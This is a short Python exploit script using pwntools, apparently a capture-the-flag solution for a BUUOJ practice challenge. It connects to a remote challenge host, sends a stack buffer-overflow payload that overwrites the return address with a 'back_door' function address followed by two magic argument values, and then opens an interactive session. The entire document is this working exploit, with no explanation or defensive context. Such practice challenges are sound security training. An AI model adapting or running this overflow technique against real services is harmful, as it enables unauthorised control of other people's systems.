from pwn import *


p = remote("node4.buuoj.cn", 26303)


back_door = 0x080485CB

pad = cyclic(0x6c+0x4)
pad += p32(back_door)+p32(0)+p32(0xDEADBEEF)+p32(0xDEADC0DE)
p.sendline(pad)

p.interactive()


